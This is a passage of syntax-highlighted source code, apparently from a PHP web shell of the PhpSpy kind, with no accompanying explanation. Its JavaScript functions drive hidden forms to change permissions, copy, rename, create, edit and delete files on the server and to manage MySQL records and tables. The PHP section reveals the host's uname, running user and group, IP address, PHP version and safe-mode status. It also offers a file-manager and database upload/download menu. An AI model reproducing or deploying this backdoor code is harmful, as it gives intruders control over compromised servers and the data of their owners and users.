<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileperm'</span>).<span style="color: #d54e53; font-weight: bold;">pfile</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">pfile</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileperm'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">copyfile</span>(<span style="color: #d54e53; font-weight: bold;">sname</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">tofile</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">tofile</span> = <span style="color: #eaeaea; background-color: #000000;">prompt(</span><span style="color: #70c0b1;">'Original file:'</span>+<span style="color: #d54e53; font-weight: bold;">sname</span>+<span style="color: #70c0b1;">'\nPlease input object file (fullpath</span><span style="color: #70c0b1; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">tofile</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'copyfile'</span>).<span style="color: #d54e53; font-weight: bold;">tofile</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">tofile</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'copyfile'</span>).<span style="color: #d54e53; font-weight: bold;">sname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">sname</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'copyfile'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">rename</span>(<span style="color: #d54e53; font-weight: bold;">oldname</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">newfilename</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">newfilename</span> = <span style="color: #eaeaea; background-color: #000000;">prompt(</span><span style="color: #70c0b1;">'Former file name:'</span>+<span style="color: #d54e53; font-weight: bold;">oldname</span>+<span style="color: #70c0b1;">'\nPlease input new filenam</span><span style="color: #70c0b1; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">newfilename</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'rename'</span>).<span style="color: #d54e53; font-weight: bold;">newfilename</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">newfilename</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'rename'</span>).<span style="color: #d54e53; font-weight: bold;">oldname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">oldname</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'rename'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">dofile</span>(<span style="color: #d54e53; font-weight: bold;">doing</span>,<span style="color: #d54e53; font-weight: bold;">thefile</span>,<span style="color: #d54e53; font-weight: bold;">m</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #eaeaea; background-color: #000000;">confirm(</span><span style="color: #d54e53; font-weight: bold;">m</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'filelist'</span>).<span style="color: #d54e53; font-weight: bold;">doing</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">doing</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">thefile</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'filelist'</span>).<span style="color: #d54e53; font-weight: bold;">thefile</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">thefile</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'filelist'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">createfile</span>(<span style="color: #d54e53; font-weight: bold;">nowpath</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">filename</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">filename</span> = <span style="color: #eaeaea; background-color: #000000;">prompt(</span><span style="color: #70c0b1;">'Please input the file name:'</span>, <span style="color: #70c0b1;">''</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">filename</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">opfile(</span><span style="color: #70c0b1;">'editfile'</span>,<span style="color: #d54e53; font-weight: bold;">nowpath</span> + <span style="color: #d54e53; font-weight: bold;">filename</span>,<span style="color: #d54e53; font-weight: bold;">nowpath</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">opfile</span>(<span style="color: #d54e53; font-weight: bold;">action</span>,<span style="color: #d54e53; font-weight: bold;">opfile</span>,<span style="color: #d54e53; font-weight: bold;">dir</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileopform'</span>).<span style="color: #d54e53; font-weight: bold;">action</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">action</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileopform'</span>).<span style="color: #d54e53; font-weight: bold;">opfile</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">opfile</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileopform'</span>).<span style="color: #d54e53; font-weight: bold;">dir</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileopform'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">godir</span>(<span style="color: #d54e53; font-weight: bold;">dir</span>,<span style="color: #d54e53; font-weight: bold;">view_writable</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">view_writable</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'godir'</span>).<span style="color: #d54e53; font-weight: bold;">view_writable</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">view_writable</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'godir'</span>).<span style="color: #d54e53; font-weight: bold;">dir</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'godir'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getsize</span>(<span style="color: #d54e53; font-weight: bold;">getdir</span>,<span style="color: #d54e53; font-weight: bold;">dir</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'getsize'</span>).<span style="color: #d54e53; font-weight: bold;">getdir</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">getdir</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'getsize'</span>).<span style="color: #d54e53; font-weight: bold;">dir</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'getsize'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">editrecord</span>(<span style="color: #d54e53; font-weight: bold;">action</span>, <span style="color: #d54e53; font-weight: bold;">base64</span>, <span style="color: #d54e53; font-weight: bold;">tablename</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">action</span> == <span style="color: #70c0b1;">'del'</span>) {<span style="color: #d54e53; background-color: #424242;">      </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #eaeaea; background-color: #000000;">confirm(</span><span style="color: #70c0b1;">'Is or isn\'t deletion record?'</span>)) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'recordlist'</span>).<span style="color: #d54e53; font-weight: bold;">doing</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">action</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'recordlist'</span>).<span style="color: #d54e53; font-weight: bold;">base64</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">base64</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'recordlist'</span>).<span style="color: #d54e53; font-weight: bold;">tablename</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">tablename</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'recordlist'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">moddbname</span>(<span style="color: #d54e53; font-weight: bold;">dbname</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!<span style="color: #d54e53; font-weight: bold;">dbname</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'setdbname'</span>).<span style="color: #d54e53; font-weight: bold;">dbname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">dbname</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'setdbname'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">settable</span>(<span style="color: #d54e53; font-weight: bold;">tablename</span>,<span style="color: #d54e53; font-weight: bold;">doing</span>,<span style="color: #d54e53; font-weight: bold;">page</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!<span style="color: #d54e53; font-weight: bold;">tablename</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">doing</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'settable'</span>).<span style="color: #d54e53; font-weight: bold;">doing</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">doing</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">page</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'settable'</span>).<span style="color: #d54e53; font-weight: bold;">page</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">page</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'settable'</span>).<span style="color: #d54e53; font-weight: bold;">tablename</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">tablename</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'settable'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">s</span>(<span style="color: #d54e53; font-weight: bold;">action</span>,<span style="color: #d54e53; font-weight: bold;">nowpath</span>,<span style="color: #d54e53; font-weight: bold;">p1</span>,<span style="color: #d54e53; font-weight: bold;">p2</span>,<span style="color: #d54e53; font-weight: bold;">p3</span>,<span style="color: #d54e53; font-weight: bold;">p4</span>,<span style="color: #d54e53; font-weight: bold;">p5</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">action</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">action</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">action</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">nowpath</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">nowpath</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">nowpath</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">p1</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">p1</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">p1</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">p2</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">p2</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">p2</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">p3</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">p3</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">p3</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">p4</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">p4</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">p4</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">p5</span>) <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #d54e53; font-weight: bold;">p4</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">p5</span>;
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">g</span>(<span style="color: #d54e53; font-weight: bold;">action</span>,<span style="color: #d54e53; font-weight: bold;">nowpath</span>,<span style="color: #d54e53; font-weight: bold;">p1</span>,<span style="color: #d54e53; font-weight: bold;">p2</span>,<span style="color: #d54e53; font-weight: bold;">p3</span>,<span style="color: #d54e53; font-weight: bold;">p4</span>,<span style="color: #d54e53; font-weight: bold;">p5</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!<span style="color: #d54e53; font-weight: bold;">action</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">s(</span><span style="color: #d54e53; font-weight: bold;">action</span>,<span style="color: #d54e53; font-weight: bold;">nowpath</span>,<span style="color: #d54e53; font-weight: bold;">p1</span>,<span style="color: #d54e53; font-weight: bold;">p2</span>,<span style="color: #d54e53; font-weight: bold;">p3</span>,<span style="color: #d54e53; font-weight: bold;">p4</span>,<span style="color: #d54e53; font-weight: bold;">p5</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'opform'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #7aa6da;">&lt;/script&gt;</span>
<span style="color: #7aa6da;">&lt;/head&gt;</span>
<span style="color: #7aa6da;">&lt;body</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
<span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=<span style="color: #7aa6da;">&gt;</span><span style="color: #70c0b1;">'opform'</span>));
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>, $<span style="color: #e7c547;">action</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'nowpath'</span>, $<span style="color: #e7c547;">nowpath</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'p1'</span>, $<span style="color: #e7c547;">p1</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'p2'</span>, $<span style="color: #e7c547;">p2</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'p3'</span>, $<span style="color: #e7c547;">p3</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'p4'</span>, $<span style="color: #e7c547;">p4</span>);
<span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'p5'</span>, $<span style="color: #e7c547;">p5</span>);
<span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="color: #b9ca4a;">if</span>(!<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'posix_getegid'</span>)) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">user</span> = @<span style="color: #eaeaea; background-color: #000000;">get_current_user(</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">uid</span> = @<span style="color: #eaeaea; background-color: #000000;">getmyuid(</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">gid</span> = @<span style="color: #eaeaea; background-color: #000000;">getmygid(</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">group</span> = <span style="color: #70c0b1;">"?"</span>;
} <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">uid</span> = @<span style="color: #eaeaea; background-color: #000000;">posix_getpwuid(</span>@<span style="color: #eaeaea; background-color: #000000;">posix_geteuid(</span>));
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">gid</span> = @<span style="color: #eaeaea; background-color: #000000;">posix_getgrgid(</span>@<span style="color: #eaeaea; background-color: #000000;">posix_getegid(</span>));
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">user</span> = $<span style="color: #e7c547;">uid</span>[<span style="color: #70c0b1;">'name'</span>];
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">uid</span> = $<span style="color: #e7c547;">uid</span>[<span style="color: #70c0b1;">'uid'</span>];
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">group</span> = $<span style="color: #e7c547;">gid</span>[<span style="color: #70c0b1;">'name'</span>];
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">gid</span> = $<span style="color: #e7c547;">gid</span>[<span style="color: #70c0b1;">'gid'</span>];
}

<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;table</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span> <span style="color: #7aa6da;">border=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">cellpadding=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">cellspacing=</span><span style="color: #70c0b1;">"0"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;tr</span> <span style="color: #7aa6da;">class=</span><span style="color: #70c0b1;">"head"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td&gt;&lt;span</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"float:right;"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">echo</span> @<span style="color: #eaeaea; background-color: #000000;">php_uname(</span>);<span style="color: #c397d8;">?&gt;</span> / <span style="color: #d54e53; font-weight: bold;">User</span>:<span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">e</span><span style="color: #b9ca4a; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> $</span><span style="color: #e7c547; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/span&gt;</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b9ca4a; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #7aa6da; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b9ca4a; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">gethostbyname(</span><span style="text-decoration: underline;">$</span><span style="color: #7aa6da; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/tr&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;tr</span> <span style="color: #7aa6da;">class=</span><span style="color: #70c0b1;">"alt1"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;span</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"float:right;"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">PHP</span> <span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">echo</span> <span style="color: #7aa6da;">PHP_VERSION</span>;<span style="color: #c397d8;">?&gt;</span> / <span style="color: #d54e53; font-weight: bold;">Safe</span> <span style="color: #d54e53; font-weight: bold;">Mode</span><span style="text-decoration: underline;">:</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b9ca4a; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">getcfg(</span><span style="color: #70c0b1; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/span&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('logout');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Logout</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('file');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">File</span> <span style="color: #d54e53; font-weight: bold;">Manager</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('mysqladmin');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">MYSQL</span> <span style="color: #d54e53; font-weight: bold;">Manager</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('sqlfile');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">MySQL</span> <span style="color: #d54e53; font-weight: bold;">Upload</span> &amp;<span style="color: #d54e53; font-weight: bold;">amp</span>; <span style="color: #d54e53; font-weight: bold;">Download</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242; text-decoration: underline;"> </span>
